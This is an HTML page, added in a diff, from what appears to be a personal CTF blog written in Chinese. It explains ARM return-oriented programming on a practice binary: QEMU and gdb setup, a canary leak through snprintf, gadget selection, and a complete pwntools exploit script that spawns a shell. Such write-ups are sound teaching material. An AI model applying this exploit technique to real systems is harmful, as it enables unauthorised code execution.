@@ -1,0 +1,222 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ARM架构的ROP - BlackMax&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="​    上周做了一道Arm架构上的裸的ROP，在大佬的指点下稀里糊涂的做完了，今天有时间还是自己从头做一遍，熟悉一下利用通用gadget的方法。
+运行Arm的binary​    arm的程序不能,"> 
+    <meta name="author" content="BlackMax"> 
+    <link rel="alternative" href="atom.xml" title="BlackMax&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">BlackMax&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="blackmax1s.me"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">ARM架构的ROP</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ARM架构的ROP</h1>
+        <div class="stuff">
+            <span>一月 05, 2019</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>​    上周做了一道Arm架构上的裸的ROP，在大佬的指点下稀里糊涂的做完了，今天有时间还是自己从头做一遍，熟悉一下利用通用gadget的方法。</p>
+<h3 id="运行Arm的binary"><a href="#运行Arm的binary" class="headerlink" title="运行Arm的binary"></a>运行Arm的binary</h3><p>​    arm的程序不能直接在x86的机器上运行，所以我们需要使用QEMU运行，所以我们需要安装一些环境，pwngdb和qemu就不说了，除此之外我们还需要安装gdb-multiarch，这个是能支持多种架构的gdb，要安装的。再之后还需要安装相应架构的共享库，比如这里的arm，我们先看看有哪些待选项</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> ~/CTF/armpwn  apt-cache search <span class="string">"libc6"</span> | grep <span class="string">"arm"</span>                                   </span><br><span class="line">libc6-arm64-cross - GNU C Library: Shared libraries (<span class="keyword">for</span> cross-compiling)</span><br><span class="line">libc6-armhf-cross - GNU C Library: Shared libraries (<span class="keyword">for</span> cross-compiling)</span><br><span class="line">libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (<span class="keyword">for</span> cross-compiling)</span><br><span class="line">libc6-dev-armhf-cross - GNU C Library: Development Libraries and Header Files (<span class="keyword">for</span> cross-compiling)</span><br><span class="line">libc6-armel-armhf-cross - Dummy package to get libc6:armel installed</span><br><span class="line">libc6-armel-cross - GNU C Library: Shared libraries (<span class="keyword">for</span> cross-compiling)</span><br><span class="line">libc6-armhf-armel-cross - Dummy package to get libc6:armhf installed</span><br><span class="line">libc6-dbg-arm64-cross - GNU C Library: detached debugging symbols (<span class="keyword">for</span> cross-compiling)</span><br><span class="line">libc6-dbg-armel-cross - GNU C Library: detached debugging symbols (<span class="keyword">for</span> cross-compiling)</span><br><span class="line">libc6-dbg-armhf-cross - GNU C Library: detached debugging symbols (<span class="keyword">for</span> cross-compiling)</span><br><span class="line">libc6-dev-armel-armhf-cross - Dummy package to get libc6-dev:armel installed</span><br><span class="line">libc6-dev-armel-cross - GNU C Library: Development Libraries and Header Files (<span class="keyword">for</span> cross-compiling)</span><br><span class="line">libc6-dev-armhf-armel-cross - Dummy package to get libc6-dev:armhf installed</span><br></pre></td></tr></table></figure>
+
+<p>​    我装了好几个，虽然不清楚其中的区别有哪些，不过安装完后在/usr/目录下能看到类似的一般就没问题了</p>
+<p><img src="armpwn/arm.png" alt="armtools"></p>
+<p>​    调试arm程序的命令和x86的也有所区别，首先我们需要用QEMU启动，指定共享库，并开启一个端口，我在本地开了1234这个端口运行程序，用的是arm-linux-gnueabi这个共享库</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./armpwn</span><br></pre></td></tr></table></figure>
+
+<p>​    然后启用<strong>gdb-multiarch</strong>，注意不是gdb了！然后设置一下架构并连接到端口</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>
+
+<p>​    然后就能看到熟悉的界面了，剩下的跟平时的gdb操作一样了。</p>
+<p><img src="armpwn/gdb.png" alt="gdb"></p>
+<p>​    用脚本运行程序的时候需要注意，这里process吃的参数是一个<strong>list</strong>！！不再是一个字符串了，可以用split(‘ ‘)快速分割。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh = process(<span class="string">'qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./armpwn.bak'</span>.split(<span class="string">' '</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>​    先看一下保护情况</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     arm-32-little</span><br><span class="line">  RELRO:    Partial RELRO</span><br><span class="line">  Stack:    Canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+
+<p>​    丢到ida里看一下，程序逻辑很简单，先输入一个name，然后程序会把整个字符串的长度保存在s的第一个byte，然后就可以输入溢出的payload了。程序还提供了system函数，和/bin/sh字符串，明摆着让我们用。</p>
+<p><img src="armpwn/system.png" alt="system"></p>
+<p><img src="armpwn/ida.png" alt="ida"></p>
+<p>​    知道逻辑之后就开始调试吧，因为开了canary，所以要先想办法泄露canary，这里的snprintf()就可以拿来泄露整个buf。然后从中截取出canary。</p>
+<p>​    根据调试，我们可以得到在输入第一次内容之后，再输入0x18个bytes就会到canary的位置，后面就可以构造ROP chain，于是第二次的payload可以构造成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flat(<span class="string">'a'</span> * <span class="number">0x18</span>, canary, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+
+<p>（这里的数字先占位，后面根据调试结果修改）</p>
+<p>​    程序正常运行会执行到这句话</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0x10794    beq    <span class="comment">#0x1079c</span></span><br><span class="line">   ↓</span><br><span class="line">  0x1079c    sub    sp, fp, <span class="comment">#4</span></span><br><span class="line">→ 0x107a0    pop    &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    这里就会从栈上取值，一个给fp，一个给pc，那我们就可以控PC来跳到想要的gadget上了。用ropgadget工具找到一个gadget，可以控r4-r8， sb， sl， pc寄存器，这样就又能跳到我们想要的函数上了。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00010804 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    最后，csu_init部分有个类似call的指令，如果我们把参数控成”/bin/sh”，目的地址控成system的地址，那就可以shell了。看一下这部分代码的逻辑：</p>
+<p><img src="armpwn/csu_init.png" alt="init"></p>
+<p>​    我们最后关注的寄存器是r0和r3，r0中保存的是参数，我们希望控成“/bin/sh”，r3中保存的是目的地址，我们希望控制成system的地址。虽然我们没有能直接控制r0和r3的gadget，但是r0可以被r7控制，r3可以被r5控制，所以我们只要控r5和r7即可。</p>
+<p>​    接下来就用flat(‘a’ * 0x18, canary, 1, 2, 3, 4, 5, 6, 7, 8)这个payload的来调试，这里我们随便填的内容被加载到寄存器里肯定运行会出错，把对应的数字改成想要的内容就好了，比如说这里运行报错时，pc=1，那就把1改成想要的地址，然后接着调，最后我的payload</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flat(<span class="string">'a'</span> * 0x18, canary, 0x10804, 0x10804, 3, binary.got[<span class="string">'system'</span>], 5, 0x21044, 7, 8, 9, 0x107E4)</span><br></pre></td></tr></table></figure>
+
+<p>(LDR这个指令我也不认识，查了一下是这样说的arm中的mov只能在寄存器之间移动数据， ldr r0, 0x12345678的功能就是把0x12345678这个地址中的值存放到r0中。类似mov)</p>
+<p>​    最后，exp写的很丑，就这样吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'i386'</span>)</span><br><span class="line">binary = ELF(<span class="string">'./armpwn.bak'</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'INFO'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'info'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    sh = remote(<span class="string">"127.0.0.1"</span>, <span class="string">"1233"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">'qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./armpwn.bak'</span>.split(<span class="string">' '</span>))</span><br><span class="line">sh.recv()</span><br><span class="line">raw_input(<span class="string">'waiting for gdb attach ...'</span>)</span><br><span class="line">sh.send(<span class="string">'a'</span> * <span class="number">0x14</span>)</span><br><span class="line">rec = sh.recvuntil(<span class="string">'On\n'</span>)</span><br><span class="line">canary = u32(<span class="string">'\x00'</span> + rec.split(<span class="string">'\x00'</span>)[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] canary:'</span>, hex(canary)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'a'</span> * <span class="number">0x18</span>, canary, <span class="number">0x10804</span>, <span class="number">0x10804</span>, <span class="number">3</span>, binary.got[<span class="string">'system'</span>], <span class="number">5</span>, <span class="number">0x21044</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0x107E4</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/5146554.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/qq/001faIUs4M2zna.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
